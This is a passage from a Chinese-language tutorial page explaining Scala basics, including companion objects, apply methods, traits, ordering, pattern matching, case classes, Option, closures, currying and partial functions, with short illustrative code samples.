<li>2、object中只有无参构造器</li>
<li>3、主构造代码块只能执行一次，因为它是单例的</li>
</ul>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">ObjectDemo</span> </span>&#123; </span><br><span class="line">  println(<span class="string">&quot;这是单例对象的代码！&quot;</span>) </span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123; </span><br><span class="line">    <span class="keyword">val</span> object1=<span class="type">ObjectDemo</span> </span><br><span class="line">    <span class="keyword">val</span> object2=<span class="type">ObjectDemo</span> </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="伴生类与伴生对象"><a href="#伴生类与伴生对象" class="headerlink" title="伴生类与伴生对象"></a>伴生类与伴生对象</h4><p>当单例对象与某个类具有相同的名称时，它被称为这个类的“伴生对象”；</p>
<p>类和它的伴生对象必须存在于同一个文件中，而且可以相互访问私有成员（字段和方法）；</p>
<p>个人觉得就是为了弥补没有static关键字的手段</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">static_test</span></span>&#123;</span><br><span class="line">  <span class="keyword">val</span> id=<span class="number">1</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">val</span> name=<span class="string">&quot;xiaoyuyu&quot;</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">printName</span></span>(): <span class="type">Unit</span> =&#123;</span><br><span class="line">    println(static_test.action + name)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">static_test</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">val</span> action = <span class="string">&quot;run&quot;</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> p = <span class="keyword">new</span> static_test</span><br><span class="line">    p.printName() <span class="comment">// runxiaoyuyu</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="object中的apply方法"><a href="#object中的apply方法" class="headerlink" title="object中的apply方法"></a>object中的apply方法</h4><p>object 中有一个非常重要的特殊方法 – apply方法；</p>
<ul>
<li><strong>apply</strong>方法通常定义在伴生对象中，目的是通过伴生类的构造函数功能，来实现伴生对象的构造函数功能；</li>
<li>通常我们会在类的伴生对象中定义apply方法，<strong>当遇到类名(参数1,…参数n)时apply方法会被调用</strong>；</li>
<li>在创建伴生对象或伴生类的对象时，通常不会使用new class/class() 的方式，而是<strong>直接使用</strong> <strong>class()隐式的调用伴生对象的</strong> <strong>apply</strong> <strong>方法</strong>，这样会让对象创建的更加简洁；</li>
</ul>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">speak</span> </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123; </span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">speak</span></span>: <span class="type">Unit</span> = &#123; </span><br><span class="line">    println(<span class="string">&quot;woof&quot;</span>) </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123; </span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">speak</span></span>: <span class="type">Unit</span> = &#123; </span><br><span class="line">    println(<span class="string">&quot;meow&quot;</span>) </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Animal</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">apply</span></span>(str: <span class="type">String</span>): <span class="type">Animal</span> = &#123; </span><br><span class="line">    <span class="keyword">if</span> (str == <span class="string">&quot;dog&quot;</span>) </span><br><span class="line">    <span class="keyword">new</span> <span class="type">Dog</span> </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">new</span> <span class="type">Cat</span> </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123; </span><br><span class="line">  	<span class="keyword">val</span> cat = <span class="type">Animal</span>(<span class="string">&quot;cat&quot;</span>) </span><br><span class="line">  	cat.speak </span><br><span class="line">  	<span class="keyword">val</span> dog = <span class="type">Animal</span>(<span class="string">&quot;dog&quot;</span>) </span><br><span class="line">  	dog.speak</span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>这个和java差不多，依然是extends</p>
<h4 id="类型检查与转换"><a href="#类型检查与转换" class="headerlink" title="类型检查与转换"></a>类型检查与转换</h4><p>要测试某个对象是否属于某个给定的类，可以用isInstanceOf方法。如果测试成功，可以用asInstanceOf方法进行类型转换。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(p.isInstanceOf[<span class="type">Employee</span>])&#123; </span><br><span class="line">	<span class="comment">//s的类型转换为Employee </span></span><br><span class="line">  <span class="keyword">val</span> s = p.asInstanceOf[<span class="type">Employee</span>] </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果p指向的是Employee类及其子类的对象，则p.isInstanceOf[Employee]将会成功。</p>
<p>如果p是null，则p.isInstanceOf[Employee]将返回false，且p.asInstanceOf[Employee]将返回null。</p>
<p>如果p不是一个Employee，则p.asInstanceOf[Employee]将抛出异常。</p>
<p>如果想要测试p指向的是一个Employee对象但又不是其子类，可以用：</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(p.getClass == classOf[<span class="type">Employee</span>])</span><br></pre></td></tr></table></figure>

<p>不过，与类型检查和转换相比，模式匹配通常是更好的选择</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">p <span class="keyword">match</span>&#123;</span><br><span class="line">  <span class="comment">//将s作为Employee处理 </span></span><br><span class="line">  <span class="keyword">case</span> s: <span class="type">Employee</span> =&gt; ... </span><br><span class="line">  <span class="comment">//p不是Employee的情况 </span></span><br><span class="line">  <span class="keyword">case</span> _ =&gt; .... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="特质trait"><a href="#特质trait" class="headerlink" title="特质trait"></a>特质trait</h3><h4 id="作为接口trait"><a href="#作为接口trait" class="headerlink" title="作为接口trait"></a>作为接口trait</h4><p>Scala中的trait特质是一种特殊的概念。</p>
<p>首先可以将trait作为接口来使用，此时的trait就与Java中的接口非常类似。</p>
<p>在trait中可以定义抽象方法，与抽象类中的抽象方法一样，只要不给出方法的具体实现即可。</p>
<p>类可以使用extends关键字继承trait。</p>
<p>注意：在Scala中没有implement的概念，无论继承类还是trait特质，统一都是extends。</p>
<p>类继承trait特质后，必须实现其中的抽象方法，实现时<strong>可以省略override关键字</strong>。</p>
<p>Scala不支持对类进行多继承，但是<strong>支持多重继承trait</strong>特质，使用<strong>with</strong>关键字即可。 </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义一个trai特质 </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">HelloTrait</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">sayHello</span> </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个trai特质 </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">MakeFriendTrait</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">makeFriend</span> </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//继承多个trait,第一个trait使用extends关键字，其它trait使用with关键字 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>(<span class="params">name: <span class="type">String</span></span>) <span class="keyword">extends</span> <span class="title">HelloTrait</span> <span class="keyword">with</span> <span class="title">MakeFriendsTrait</span> <span class="keyword">with</span> <span class="title">Serializable</span> </span>&#123; </span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">sayHello</span></span>() = println(<span class="string">&quot;Hello, My name is &quot;</span> + name) </span><br><span class="line">  <span class="comment">//override关键字也可以省略 </span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">makeFriend</span></span>() = println(<span class="string">&quot;Hello，&quot;</span> + name) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="带有具体实现的特质"><a href="#带有具体实现的特质" class="headerlink" title="带有具体实现的特质"></a>带有具体实现的特质</h4><ul>
<li>Scala中的trait特质不仅仅可以定义抽象方法，还可以定义具体实现的方法，这时的trait更像是包含了通用工具方法的类。比如，trait中可以包含一些很多类都通用的功能方法，比如打印日志等等，Spark中就使用了trait来定义通用的日志打印方法。</li>
<li>Scala trait特质中的字段可以是抽象的，也可以是具体的。</li>
</ul>
<h4 id="特质构造顺序"><a href="#特质构造顺序" class="headerlink" title="特质构造顺序"></a>特质构造顺序</h4><p>在Scala中，trait特质也是有构造器的，也就是trait中的不包含在任何方法中的代码。</p>
<p>构造器以如下顺序执行：</p>
<ul>
<li>1、执行父类的构造器；</li>
<li>2、执行trait的构造器，多个trait从左到右依次执行；</li>
<li>3、构造trait时会先构造父trait，如果多个trait继承同一个父trait，则父trait只会构造一次；</li>
<li>4、所有trait构造完毕之后，子类的构造器才执行</li>
</ul>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person2</span> </span>&#123; println(<span class="string">&quot;Person&#x27;s constructor!&quot;</span>) &#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Logger</span> </span>&#123; println(<span class="string">&quot;Logger&#x27;s constructor!&quot;</span>) &#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">MyLogger</span> <span class="keyword">extends</span> <span class="title">Logger</span> </span>&#123; println(<span class="string">&quot;MyLogger&#x27;s constructor!&quot;</span>) &#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">TimeLogger</span> <span class="keyword">extends</span> <span class="title">Logger</span> </span>&#123; println(<span class="string">&quot;TimeLogger&#x27;s constructor!&quot;</span>) &#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//类既继承了类又继承了特质，要先写父类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student2</span> <span class="keyword">extends</span> <span class="title">Person2</span> <span class="keyword">with</span> <span class="title">MyLogger</span> <span class="keyword">with</span> <span class="title">TimeLogger</span> </span>&#123; </span><br><span class="line">  println(<span class="string">&quot;Student&#x27;s constructor!&quot;</span>) </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Person&#x27;s constructor! </span></span><br><span class="line"><span class="comment">// Logger&#x27;s constructor! </span></span><br><span class="line"><span class="comment">// MyLogger&#x27;s constructor! </span></span><br><span class="line"><span class="comment">// TimeLogger&#x27;s constructor! </span></span><br><span class="line"><span class="comment">// Student&#x27;s constructor!</span></span><br></pre></td></tr></table></figure>

<h4 id="特质继承类"><a href="#特质继承类" class="headerlink" title="特质继承类"></a>特质继承类</h4><p>在Scala中，trait特质也可以继承class类，此时这个class类就会成为所有继承此trait的类的父类。</p>
<h3 id="排序Ordered和Ordering"><a href="#排序Ordered和Ordering" class="headerlink" title="排序Ordered和Ordering"></a>排序Ordered和Ordering</h3><p>在Java中对象的比较有两个接口，分别是Comparable和Comparator。它们之间的区别在于：</p>
<p>实现Comparable接口的类，重写compareTo()方法后，其对象自身就具有了可比较性； 实现Comparator接口的类，重写了compare()方法后，则提供一个第三方比较器，用于比较两个对象。</p>
<p>在Scala中也引入了以上两种比较方法(Scala.math包下):</p>
<p>Ordered特质混入Java的Comparable接口，它定义了相同类型间的比较方式，但这种内部比较方式是单一的；</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Ordered</span>[<span class="type">A</span>] <span class="keyword">extends</span> <span class="title">Any</span> <span class="keyword">with</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Comparable</span>[<span class="type">A</span>]</span>&#123;......&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">Project</span>(<span class="params">tag:<span class="type">String</span>, score:<span class="type">Int</span></span>) <span class="keyword">extends</span> <span class="title">Ordered</span>[<span class="type">Project</span>] </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">compare</span></span>(pro:<span class="type">Project</span> ) = tag.compareTo(pro.tag) </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">OrderedDemo</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123; </span><br><span class="line">    <span class="keyword">val</span> list = <span class="type">List</span>(<span class="type">Project</span>(<span class="string">&quot;hadoop&quot;</span>,<span class="number">60</span>), <span class="type">Project</span>(<span class="string">&quot;flink&quot;</span>,<span class="number">90</span>), <span class="type">Project</span>(<span class="string">&quot;hive&quot;</span>,<span class="number">70</span>),<span class="type">Project</span>(<span class="string">&quot;spark&quot;</span>,<span class="number">80</span>)) </span><br><span class="line">    println(list.sorted) </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Ordering特质混入Comparator接口，它是提供第三方比较器，可以自定义多种比较方式，在实际开发中也是使用比较多的，灵活解耦合。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Ordering</span>[<span class="type">T</span>] <span class="keyword">extends</span> <span class="title">Comparator</span>[<span class="type">T</span>] <span class="keyword">with</span> <span class="title">PartialOrdering</span>[<span class="type">T</span>] <span class="keyword">with</span> <span class="title">Serializable</span> </span>&#123;......&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">OrderingDemo</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123; </span><br><span class="line">    <span class="keyword">val</span> pairs = <span class="type">Array</span>((<span class="string">&quot;a&quot;</span>, <span class="number">7</span>, <span class="number">2</span>), (<span class="string">&quot;c&quot;</span>, <span class="number">9</span>, <span class="number">1</span>), (<span class="string">&quot;b&quot;</span>, <span class="number">8</span>, <span class="number">3</span>)) </span><br><span class="line">    <span class="comment">// Ordering.by[(Int,Int,Double),Int](_._2)表示从Tuple3转到Int型 </span></span><br><span class="line">    <span class="comment">// 并按此Tuple3中第二个元素进行排序 </span></span><br><span class="line">    <span class="type">Sorting</span>.quickSort(pairs)(<span class="type">Ordering</span>.by[(<span class="type">String</span>, <span class="type">Int</span>, <span class="type">Int</span>), <span class="type">Int</span>](_._2)) </span><br><span class="line">    println(pairs.toBuffer) </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模式匹配和样例类"><a href="#模式匹配和样例类" class="headerlink" title="模式匹配和样例类"></a>模式匹配和样例类</h3><h4 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h4><p>模式匹配的基本语法结构：<strong>变量</strong> <strong>match { case</strong> <strong>值</strong> <strong>=&gt;</strong> <strong>代码</strong> <strong>}</strong></p>
<p>模式匹配match case中，只要有一个case分支满足并处理了，就不会继续判断下一个case分支了，不需要使用break语句。这点与Java不同，Java的switch case需要用break阻止。如果值为下划线，则代表不满足以上所有情况的时候如何处理。</p>
<p>模式匹配match case最基本的应用，就是对变量的值进行模式匹配。match是表达式，与if表达式一样，是有返回值的。</p>
<p>除此之外，Scala还提供了样例类，对模式匹配进行了优化，可以快速进行匹配。</p>
<h4 id="匹配类型"><a href="#匹配类型" class="headerlink" title="匹配类型"></a>匹配类型</h4><p>Scala的模式匹配还有一个强大的功能，它可以直接匹配类型，而不是值。这一点是Java的switch case做不到的。 </p>
<p>匹配类型的语法：<strong>变量 match {case</strong> <strong>变量</strong> <strong>:</strong> <strong>类型</strong> <strong>=&gt;</strong> **代码}**，而不是匹配值的“case 值 =&gt; 代码”这种语法。</p>
<h4 id="匹配数组、元组、集合"><a href="#匹配数组、元组、集合" class="headerlink" title="匹配数组、元组、集合"></a>匹配数组、元组、集合</h4><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123; </span><br><span class="line">  <span class="keyword">val</span> arr = <span class="type">Array</span>(<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>) </span><br><span class="line">  <span class="comment">//对Array数组进行模式匹配，分别匹配： </span></span><br><span class="line">  <span class="comment">//带有指定个数元素的数组、带有指定元素的数组、以某元素开头的数组 </span></span><br><span class="line">  arr <span class="keyword">match</span> &#123; </span><br><span class="line">    <span class="keyword">case</span> <span class="type">Array</span>(<span class="number">0</span>, x, y) =&gt; println(x + <span class="string">&quot; &quot;</span> + y) </span><br><span class="line">    <span class="keyword">case</span> <span class="type">Array</span>(<span class="number">0</span>) =&gt; println(<span class="string">&quot;only 0&quot;</span>) </span><br><span class="line">    <span class="comment">//匹配数组以1开始作为第一个元素 </span></span><br><span class="line">    <span class="keyword">case</span> <span class="type">Array</span>(<span class="number">1</span>, _*) =&gt; println(<span class="string">&quot;1 ...&quot;</span>) </span><br><span class="line">    <span class="keyword">case</span> _ =&gt; println(<span class="string">&quot;something else&quot;</span>) </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">val</span> list = <span class="type">List</span>(<span class="number">3</span>, <span class="number">-1</span>) </span><br><span class="line">  <span class="comment">//对List列表进行模式匹配，与Array类似，但是需要使用List特有的::操作符 </span></span><br><span class="line">  <span class="comment">//构造List列表的两个基本单位是Nil和::，Nil表示为一个空列表 </span></span><br><span class="line">  <span class="comment">//tail返回一个除了第一元素之外的其他元素的列表 </span></span><br><span class="line">  <span class="comment">//分别匹配：带有指定个数元素的列表、带有指定元素的列表、以某元素开头的列表 </span></span><br><span class="line">  list <span class="keyword">match</span> &#123; </span><br><span class="line">    <span class="keyword">case</span> x :: y :: <span class="type">Nil</span> =&gt; println(<span class="string">s&quot;x: <span class="subst">$x</span> y: <span class="subst">$y</span>&quot;</span>) </span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span> :: <span class="type">Nil</span> =&gt; println(<span class="string">&quot;only 0&quot;</span>) </span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span> :: tail =&gt; println(<span class="string">&quot;1 ...&quot;</span>) </span><br><span class="line">    <span class="keyword">case</span> _ =&gt; println(<span class="string">&quot;something else&quot;</span>) </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">val</span> tuple = (<span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>) </span><br><span class="line">  tuple <span class="keyword">match</span> &#123; </span><br><span class="line">    <span class="keyword">case</span> (<span class="number">1</span>, x, y) =&gt; println(<span class="string">s&quot;1, <span class="subst">$x</span> , <span class="subst">$y</span>&quot;</span>) </span><br><span class="line">    <span class="keyword">case</span> (_, z, <span class="number">5</span>) =&gt; println(z) </span><br><span class="line">    <span class="keyword">case</span> _ =&gt; println(<span class="string">&quot;else&quot;</span>) </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="样例类"><a href="#样例类" class="headerlink" title="样例类"></a>样例类</h4><p>case class样例类是Scala中特殊的类。当声明样例类时，以下事情会自动发生：</p>
<ul>
<li>主构造函数接收的参数通常不需要显式使用var或val修饰，Scala会自动使用val修饰</li>
<li>自动为样例类定义了伴生对象，并提供apply方法，不用new关键字就能够构造出相应的对象</li>
<li>将生成toString、equals、hashCode和copy方法，除非显示的给出这些方法的定义</li>
<li>继承了Product和Serializable这两个特质，也就是说样例类可序列化和可应用Product的方法</li>
</ul>
<p>case class是多例的，后面要跟构造参数，case object是单例的。</p>
<p>此外，case class样例类中可以添加方法和字段，并且可用于模式匹配。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Amount</span> </span></span><br><span class="line"><span class="comment">//定义样例类Dollar，继承Amount父类 </span></span><br><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">Dollar</span>(<span class="params">value: <span class="type">Double</span></span>) <span class="keyword">extends</span> <span class="title">Amount</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义样例类Currency，继承Amount父类 </span></span><br><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">Currency</span>(<span class="params">value: <span class="type">Double</span>, unit: <span class="type">String</span></span>) <span class="keyword">extends</span> <span class="title">Amount</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义样例对象Nothing，继承Amount父类</span></span><br><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">object</span> <span class="title">Nothing</span> <span class="keyword">extends</span> <span class="title">Amount</span> </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">CaseClassDemo</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123; </span><br><span class="line">    judgeIdentity(<span class="type">Dollar</span>(<span class="number">10.0</span>)) </span><br><span class="line">    judgeIdentity(<span class="type">Currency</span>(<span class="number">20.2</span>,<span class="string">&quot;100&quot;</span>)) </span><br><span class="line">    judgeIdentity(<span class="type">Nothing</span>) </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//自定义方法，模式匹配判断amt类型 </span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">judgeIdentity</span></span>(amt: <span class="type">Amount</span>): <span class="type">Unit</span> = &#123; </span><br><span class="line">  	amt <span class="keyword">match</span> &#123; </span><br><span class="line">    	<span class="keyword">case</span> <span class="type">Dollar</span>(value) =&gt; println(<span class="string">s&quot;<span class="subst">$value</span>&quot;</span>) </span><br><span class="line">    	<span class="keyword">case</span> <span class="type">Currency</span>(value, unit) =&gt; println(<span class="string">s&quot;Oh noes,I got <span class="subst">$unit</span>&quot;</span>) </span><br><span class="line">    	<span class="keyword">case</span> <span class="type">Nothing</span> =&gt; println(<span class="string">&quot;Oh,GOD!&quot;</span>) </span><br><span class="line">  	&#125; </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Option与模式匹配"><a href="#Option与模式匹配" class="headerlink" title="Option与模式匹配"></a>Option与模式匹配</h4><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Option_Test</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> grade = <span class="type">Map</span>(<span class="string">&quot;a&quot;</span>-&gt;<span class="number">90</span>,<span class="string">&quot;b&quot;</span>-&gt;<span class="number">60</span>,<span class="string">&quot;c&quot;</span>-&gt;<span class="number">80</span>)</span><br><span class="line">    <span class="keyword">val</span> temp: <span class="type">Int</span> = grade(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">    println(temp)</span><br><span class="line">    <span class="comment">// println(grade(&quot;q&quot;)) error</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getGrade</span></span>(name:<span class="type">String</span>)=&#123;</span><br><span class="line">      <span class="keyword">val</span> maybeInt: <span class="type">Option</span>[<span class="type">Int</span>] = grade.get(name)</span><br><span class="line">      maybeInt <span class="keyword">match</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="type">None</span>=&gt;println(<span class="string">&quot;None&quot;</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="type">Some</span>(maybeInt)=&gt;println(maybeInt)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    getGrade(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">    getGrade(<span class="string">&quot;d&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="keyword">val</span> add1: <span class="type">Int</span> =&gt; <span class="type">Int</span> = (x) =&gt; x+<span class="number">1</span></span><br><span class="line"><span class="comment">// 方法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add1</span></span>(x: <span class="type">Int</span>): <span class="type">Int</span> = &#123; x + <span class="number">1</span> &#125;</span><br><span class="line"><span class="comment">// 方法转函数</span></span><br><span class="line"><span class="keyword">val</span> add2 = add1 _</span><br></pre></td></tr></table></figure>

<h4 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h4><p><strong>闭包是在其上下文中引用了自由变量的函数；</strong></p>
<p>闭包引用到函数外面定义的变量，定义这个函数的过程就是将这个自由变量捕获而构成的一个封闭的函数，也可理解</p>
<p>为”把函数外部的一个自由变量关闭进来“。</p>
<p>何为闭包？需满足下面三个条件：</p>
<ul>
<li>1、闭包是一个函数</li>
<li>2、函数必须要有返回值</li>
<li>3、返回值依赖声明在函数外部的一个或多个变量，用Java的话说，就是返回值和定义的全局变量有关</li>
</ul>
<h4 id="柯里化"><a href="#柯里化" class="headerlink" title="柯里化"></a>柯里化</h4><p>函数编程中，<strong>接收多个参数的函数都可以转化为接收单个参数的函数</strong>，这个转化过程就叫柯里化(Currying)。</p>
<p>Scala中，柯里化函数的定义形式和普通函数类似，区别在于柯里化函数拥有多组参数列表，每组参数用小括号括起来。</p>
<p>Scala API中很多函数都是柯里化的形式。</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用普通的方式 </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add1</span></span>(x: <span class="type">Int</span>, y: <span class="type">Int</span>) = x + y </span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用闭包的方式，将其中一个函数作为返回值 </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span></span>(x: <span class="type">Int</span>) = (y:<span class="type">Int</span>) =&gt; x + y </span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用柯里化的方式 </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span></span>(x: <span class="type">Int</span>)(y: <span class="type">Int</span>) = x + y </span><br><span class="line"></span><br><span class="line"><span class="comment">//调用柯里化函数add </span></span><br><span class="line">scala&gt; add(<span class="number">1</span>)(<span class="number">2</span>) </span><br><span class="line">res1: <span class="type">Int</span> = <span class="number">3</span> </span><br></pre></td></tr></table></figure>

<h4 id="偏函数"><a href="#偏函数" class="headerlink" title="偏函数"></a>偏函数</h4><p>偏函数（Partial Function）之所以“偏”，原因在于它们并不处理所有可能的输入，而只处理那些能与至少一个 case语句匹配的输入；</p>
<p>在偏函数中只能使用 <strong>case</strong> <strong>语句</strong>，整个函数必须用<strong>大括号</strong>包围。这与普通的函数字面量不同，普通的函数字面量可以使用大括号，也可以用小括号；</p>
<p>被包裹在<strong>大括号</strong>中的一组case语句是一个偏函数，是一个并非对所有输入值都有定义的函数；</p>
<p>Scala中的Partial Function是一个trait，其类型为PartialFunction[A,B]，表示：接收一个类型为A的参数，返回一个类型为B的结果。</p>
